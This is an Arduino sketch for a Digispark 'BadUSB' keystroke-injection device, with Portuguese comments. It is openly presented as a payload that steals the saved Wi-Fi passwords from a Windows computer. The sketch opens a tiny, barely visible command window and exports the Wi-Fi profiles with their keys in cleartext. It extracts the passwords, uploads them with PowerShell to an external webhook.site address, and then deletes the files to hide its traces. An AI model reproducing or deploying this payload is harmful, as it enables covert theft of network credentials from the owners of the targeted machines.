/*
O payload a seguir irá capturar a senha Wifi salva do computador e enviará para o seu webhook hospedado.
*/

#include "DigiKeyboard.h"

void setup() {
  pinMode(1, OUTPUT); //LED on Model A 
}

void loop() {
   
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //Começa o script
  DigiKeyboard.delay(100);
  DigiKeyboard.println("cmd /k mode con: cols=15 lines=1"); //menor janela de cmd possível para tentar torná-la o menos perceptível
  DigiKeyboard.delay(500);
  DigiKeyboard.println("cd %temp%"); //Ir para o diretório temp
  DigiKeyboard.delay(300);  
  DigiKeyboard.println("netsh wlan export profile key=clear"); //Pegando todas as senhas wifi salvas e salvando-as no diretório temp
  DigiKeyboard.delay(500);  
  DigiKeyboard.println("powershell Select-String -Path Wi-Fi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS"); //Extraindo todas as senhas e salvando-as no arquivo Wi-Fi-Pass no diretório temp
  DigiKeyboard.delay(500);  
  DigiKeyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/Yourlink -Method POST -InFile Wi-Fi-PASS"); //Enviando todas as senhas salvas para o WebHook
  DigiKeyboard.delay(1000);  
  DigiKeyboard.println("del Wi-Fi* /s /f /q"); //Limpando toda a bagunça
  DigiKeyboard.delay(500);  
  DigiKeyboard.println("exit");
  DigiKeyboard.delay(100);  
  digitalWrite(1, HIGH); //Liga o led quando acabar o script
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(5000);
  
}
  
